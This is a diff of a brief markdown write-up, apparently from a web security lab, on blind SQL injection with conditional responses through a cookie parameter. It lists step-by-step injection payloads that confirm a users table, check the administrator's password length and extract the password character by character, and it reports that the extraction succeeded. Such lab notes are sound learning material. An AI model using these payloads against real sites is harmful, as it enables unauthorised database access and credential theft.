@@ -11,11 +11,11 @@ Exploit Blind SQL Injection with conditional responses.
 Cookie parameter
 
 ## Payload Used
- ' AND 1=1--
- ' AND (SELECT 'a' FROM users LIMIT 1)= 'a'--
- ' AND (SELECT 'a' FROM users WHERE username= 'administrator')= 'a'--
- ' AND (SELECT 'a' FROM users WHERE username= 'administrator'AND LENGTH (password)>1 )= 'a'--
- ' AND SUBSTRING ((SELECT password FROM users WHERE username= 'administrator'),1,1 )= 'a'--
+' AND 1=1--
+' AND (SELECT 'a' FROM users LIMIT 1)= 'a'--
+' AND (SELECT 'a' FROM users WHERE username= 'administrator')= 'a'--
+' AND (SELECT 'a' FROM users WHERE username= 'administrator'AND LENGTH (password)>1 )= 'a'--
+' AND SUBSTRING ((SELECT password FROM users WHERE username= 'administrator'),1,1 )= 'a'--
  
 ## Result
 Successfully extracted the administrator password using conditional blind SQL injection.
